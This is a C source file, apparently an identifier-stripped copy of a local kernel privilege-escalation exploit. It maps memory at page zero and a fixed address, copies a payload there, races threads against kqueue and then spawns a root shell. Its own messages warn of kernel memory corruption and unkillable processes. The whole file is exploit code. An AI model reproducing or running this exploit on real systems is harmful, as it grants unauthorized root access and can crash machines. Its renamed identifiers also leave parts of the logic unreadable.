
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int pthread_t ;
struct TYPE_2__ {int tv_nsec; scalar_t__ tv_sec; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 scalar_t__ VAR_6 ;
 scalar_t__ VAR_7 ;
 int FUNC_0 (char*,char*,int *) ;
 int FUNC_1 (int) ;
 int FUNC_2 () ;
 int FUNC_3 () ;
 scalar_t__ FUNC_4 () ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int FUNC_5 () ;
 int FUNC_6 (int ,int *,int) ;
 scalar_t__ FUNC_7 (void*,int,int,int,int,int ) ;
 int FUNC_8 (char*) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (int *,int *,void*,int *) ;
 int FUNC_11 (int ) ;
 TYPE_1__ VAR_11 ;
 int FUNC_12 (int) ;

int FUNC_13(void) {
 int VAR_12;
 pthread_t VAR_13, VAR_14;

 if (!FUNC_4() || !FUNC_3()) {
  FUNC_9("already root.\n");
  FUNC_1(-1);
 }

 FUNC_9("BEWARE! this exploit isn't 100%% reliable. successful exploitation\n"
  "may cause kernel memory corruption leading to system crash.\n"
  "it is also possible, that exploit will hang and such process\n"
  "will be unkillable. hit enter if you want to continue.\n");

 FUNC_2();




 if (FUNC_7((void *)0x408b0000, 0x4000, VAR_3 | VAR_4 | VAR_2, VAR_0 | VAR_1, -1, 0) < 0) {
  FUNC_8("mmap");
  FUNC_1(-1);
 }

 if (FUNC_7(0, 0x1000, VAR_3 | VAR_4 | VAR_2, VAR_0 | VAR_1, -1, 0) < 0) {
  FUNC_8("mmap");
  FUNC_1(-1);
 }

 FUNC_6(0, &VAR_9, &VAR_5 - &VAR_9);

 if ((VAR_10 = FUNC_5()) < 0) {
  FUNC_8("kqueue");
  FUNC_1(-1);
 }

 FUNC_10(&VAR_13, ((void*)0), (void *)VAR_6, ((void*)0));
 FUNC_10(&VAR_14, ((void*)0), (void *)VAR_7, ((void*)0));

 VAR_11.tv_sec = 0;
 VAR_11.tv_nsec = 1;

 FUNC_9("waiting for root... it should take no more than few seconds.\n"
      "otherwise, run exploit again.\n");
 VAR_12 = 0;

 while (!VAR_8 && VAR_12++ < 4000)
  FUNC_12(100);

 FUNC_11(0);

 if (FUNC_4()) {
  FUNC_9("failed. on unpatched systems, the exploit will be unkillable from now. try again.\n");
  FUNC_1(-1);
 }

 FUNC_0("/bin/sh", "sh", ((void*)0));

 return 0;
}
